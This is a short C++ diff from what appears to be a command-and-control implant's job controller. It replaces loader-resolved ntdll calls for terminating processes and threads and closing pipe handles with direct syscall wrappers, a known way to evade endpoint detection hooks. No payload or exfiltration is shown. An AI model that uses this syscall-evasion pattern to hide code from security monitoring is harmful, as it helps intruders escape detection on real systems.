@@ -1,5 +1,6 @@
 #include "JobsController.h"
 #include "ApiLoader.h"
+#include "Syscalls.h"
 
 void* JobsController::operator new(size_t sz) 
 {
@@ -57,16 +58,16 @@ void JobsController::ProcessJobs(Packer* packer)
 		if (jobs[i].jobState == JOB_STATE_KILLED || jobs[i].jobState == JOB_STATE_FINISHED) {
 
 			if (jobs[i].jobType == JOB_TYPE_PROCESS || jobs[i].jobType == JOB_TYPE_SHELL)
-				ApiNt->NtTerminateProcess(jobs[i].jobObject, NULL);
+				SysNtTerminateProcess(jobs[i].jobObject, NULL);
             else if (jobs[i].jobType == JOB_TYPE_LOCAL || jobs[i].jobType == JOB_TYPE_REMOTE)
-				ApiNt->NtTerminateThread(jobs[i].jobObject, NULL);
+				SysNtTerminateThread(jobs[i].jobObject, NULL);
 
 			if (jobs[i].pipeRead) {
-				ApiNt->NtClose(jobs[i].pipeRead);
+				SysNtClose(jobs[i].pipeRead);
 				jobs[i].pipeRead = NULL;
 			}
 			if (jobs[i].pipeWrite) {
-				ApiNt->NtClose(jobs[i].pipeWrite);
+				SysNtClose(jobs[i].pipeWrite);
 				jobs[i].pipeWrite = NULL;
 			}
 
